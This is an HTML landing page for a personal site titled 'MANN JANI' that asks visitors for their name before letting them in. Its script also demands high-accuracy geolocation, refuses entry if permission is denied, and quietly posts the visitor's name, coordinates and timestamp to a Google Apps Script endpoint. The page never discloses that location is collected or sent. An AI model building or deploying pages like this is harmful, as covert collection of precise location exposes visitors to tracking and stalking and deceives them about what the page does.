<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
  
  <meta charset="UTF-8">
  <title>Access Required</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Inter", "SF Pro Display", "SF Pro Text", system-ui, sans-serif;
      background: radial-gradient(1200px circle at top, #111827 0%, #020617 55%, #000000 100%);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .box {
      background: linear-gradient(
  180deg,
  rgba(255,255,255,0.06),
  rgba(255,255,255,0.02)
);
border: 1px solid rgba(255,255,255,0.08);
backdrop-filter: blur(20px);
-webkit-backdrop-filter: blur(20px);
box-shadow: 0 30px 60px rgba(0,0,0,0.6);
    }
    input {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      border-radius: 8px;
      border: none;
      font-size: 16px;
    }
    button {
  width: 100%;
  padding: 14px;
  margin-top: 18px;
  border-radius: 12px;
  border: 1px solid rgba(255,255,255,0.15);
  background: linear-gradient(180deg, #ffffff, #e5e7eb);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  color: #020617;
  font-size: 16px;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.35s ease;
    }
    button:hover {
  transform: translateY(-1px);
  background: linear-gradient(180deg, #ffffff, #d1d5db);
  box-shadow: 0 10px 30px rgba(0,0,0,0.4);
      }
    
    .msg {
      margin-top: 15px;
      font-size: 14px;
      color: #f87171;
    }
    .note {
      margin-top: 15px;
      font-size: 12px;
      color: #94a3b8;
    }
    h2 {
  font-weight: 500;
  letter-spacing: 0.6px;
  margin-bottom: 14px;
    }
    p {
  font-size: 15px;
  line-height: 1.6;
  color: #cbd5f5;
      }
    
  </style>
</head>
<body>

<div class="box">
  <h2>MANN JANI</h2>
  <p>
This is a personal space that reflects who I am and what I’m building.
If you’re curious to know more, you’re welcome inside.
</p>

  <input type="text" id="name" placeholder="Your name" required>

  <button onclick="requestAccess()">Enter</button>

  <div class="msg" id="msg"></div>

  <div class="note">
    A quiet space, kept intentional.
  </div>
</div>

<script>
function requestAccess() {
  const name = document.getElementById("name").value.trim();
  const msg = document.getElementById("msg");

  if (!name) {
    msg.innerText = "Name is required.";
    return;
  }

  if (!navigator.geolocation) {
    msg.innerText = "Geolocation is not supported on this device.";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    function(position) {
      const data = {
        name: name,
        lat: position.coords.latitude,
        lng: position.coords.longitude,
        accuracy: position.coords.accuracy,
        time: new Date().toISOString()
      };

      fetch("https://script.google.com/macros/s/AKfycbwfvXFKgzZd7KtPlYa_3U_-ynSfcIe_bT3-pdAM9yQp-ewZ0GDCEaYqYZE8C3hS93b_uQ/exec", {
  method: "POST",
  mode: "no-cors",
  body: JSON.stringify(data)
});

localStorage.setItem("accessData", JSON.stringify(data));
window.location.href = "home.html";
      

    },
    function(error) {
      msg.innerText = "Location permission denied. Access blocked.";
    },
    { enableHighAccuracy: true }
  );
}
</script>

</body>
</html>
